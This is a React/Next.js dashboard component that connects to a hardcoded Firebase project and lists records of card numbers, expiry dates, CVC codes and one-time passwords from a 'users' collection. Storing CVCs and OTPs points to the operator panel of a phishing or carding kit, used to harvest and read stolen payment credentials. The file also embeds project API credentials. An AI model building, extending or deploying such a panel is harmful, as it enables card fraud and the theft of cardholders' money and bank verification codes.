'use client'

import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card"
import { Skeleton } from '@/components/skeleton';

import { initializeApp } from "firebase/app"
import { collection, getDocs, getFirestore } from "firebase/firestore"
import { useEffect, useState } from 'react';
import { Button } from '@/components/ui/button';

const firebaseConfig = {
  apiKey: "AIzaSyBalb45hYmw3rGK3kn5Skp2Wb4Ci3yeKHc",
  authDomain: "adsapp-for.firebaseapp.com",
  projectId: "adsapp-for",
  storageBucket: "adsapp-for.appspot.com",
  messagingSenderId: "282166621415",
  appId: "1:282166621415:web:2be67338bc64233153de42",
  measurementId: "G-PG5NPD4FES"
};
type User = {
  cardNumber: string
  expiry: string
  cvc: string
  otp: string
}
// Initialize Firebase
const app = initializeApp(firebaseConfig)
const db = getFirestore(app)

export default function Dashboard() {
  const [users, setUsers] = useState<User[]>([])
  const [loading, setLoading] = useState(false)
  const [error, setError] = useState<string | null>(null)

  const fetchUsers = async () => {
    setLoading(true)
    setError(null)
    try {
      const usersCollection = collection(db, "users")
      const userSnapshot = await getDocs(usersCollection)
      const userList = userSnapshot.docs.map(doc => ({
        id: doc.id,
        ...doc.data()
      })) as unknown as User[]
      setUsers(userList)
    } catch (err) {
      setError("Failed to fetch users. Please try again.")
      console.error("Error fetching users:", err)
    } finally {
      setLoading(false)
    }
  }

  useEffect(() => {
    fetchUsers()
  }, [])

  return (
    <div className="container mx-auto p-4">
      <Card className="w-full max-w-2xl mx-auto">
        <CardHeader>
          <CardTitle className="text-2xl font-bold">User List from Firestore</CardTitle>
        </CardHeader>
        <CardContent>
          {loading ? (
            <div className="space-y-2">
              <Skeleton className="h-4 w-full" />
              <Skeleton className="h-4 w-full" />
              <Skeleton className="h-4 w-full" />
            </div>
          ) : error ? (
            <div className="text-red-500">{error}</div>
          ) : (
            <ul className="space-y-2">
              {users.map(user => (
                <li key={user.cardNumber} className="bg-secondary p-2 rounded">
                  <p className="font-semibold">{user.expiry}</p>
                  <p className="text-sm text-muted-foreground">{user.cvc}</p>
                  <p className="text-sm text-muted-foreground">{user.otp}</p>
                </li>
              ))}
            </ul>
          )}
          <Button onClick={fetchUsers} className="mt-4">
            Refresh Users
          </Button>
        </CardContent>
      </Card>
    </div>
  )
}